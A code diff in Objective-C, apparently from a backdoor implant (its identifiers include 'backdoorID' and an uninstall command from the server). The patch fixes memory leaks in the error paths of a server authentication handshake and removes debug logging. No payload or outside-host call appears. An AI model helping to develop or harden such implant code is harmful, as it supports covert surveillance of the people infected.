@@ -158,7 +158,6 @@
       [message release];
       [encMessage release];
       [outerPool release];
-      
       return NO;
     }
   
@@ -184,6 +183,8 @@
   
   gSessionKey = [[NSMutableData alloc] initWithData: [sessionKey sha1Hash]];
 
+  [sessionKey release];
+  
   // second part of the server response contains the NOnce and the response
   // extract the NOnce and check if it is ok
   // this MUST be the same NOnce sent to the server, but since it is crypted
@@ -196,7 +197,17 @@
                              NSMakeRange(32, [replyData length] - 32)]];
     }
   @catch (NSException *e)
-    {   
+    {  
+      [kd release];
+      [nOnce release];
+      [backdoorID release];
+      [type release];
+      [idToken release];
+      [message release];
+      [encMessage release];
+      [gSessionKey release];
+      gSessionKey = nil;
+      [outerPool release];
       return NO;
     }
   
@@ -206,6 +217,17 @@
                                           length: 16];
   if ([nOnce isEqualToData: rNonce] == NO)
     {    
+      [kd release];
+      [nOnce release];
+      [backdoorID release];
+      [type release];
+      [idToken release];
+      [message release];
+      [encMessage release];
+      [gSessionKey release];
+      gSessionKey = nil;
+      [rNonce release];
+      [outerPool release];
       return NO;
     }
   
@@ -221,60 +243,52 @@
     }
   @catch (NSException *e)
     {
-#ifdef DEBUG_AUTH_NOP
-      errorLog(@"exception on protoCommand makerange (%@)", [e reason]);
-#endif
-      
+      [kd release];
+      [nOnce release];
+      [backdoorID release];
+      [type release];
+      [idToken release];
+      [message release];
+      [encMessage release];
+      [gSessionKey release];
+      gSessionKey = nil;
+      [rNonce release];
+      [_protoCommand release];
+      [outerPool release];
       return NO;
     }
   
   [kd release];
   [nOnce release];
-  // FIXED-
   [backdoorID release];
   [type release];
-  //
   [idToken release];
   [message release];
   [encMessage release];
   [ks release];
   [ksString release];
-  [sessionKey release];
   [secondPartResponse release];
   [rNonce release];
-  
   [outerPool release];
   
   switch (protoCommand)
     {
     case PROTO_OK:
       {
-#ifdef DEBUG_AUTH_NOP
-        infoLog(@"Auth Response OK");
-#endif
       } break;
     case PROTO_UNINSTALL:
       {
-#ifdef DEBUG_AUTH_NOP
-        infoLog(@"Uninstall");
-#endif
-        //XXX-
-//        RCSITaskManager *taskManager = [RCSITaskManager sharedInstance];
-//        [taskManager uninstallMeh];
       } break;
     case PROTO_NO:
     default:
       {
-#ifdef DEBUG_AUTH_NOP
-        errorLog(@"Received command: %d", protoCommand);
-#endif
-
         [_protoCommand release];
         return NO;
       } break;
     }
 
   [_protoCommand release];
+  
   return YES;
 }
 
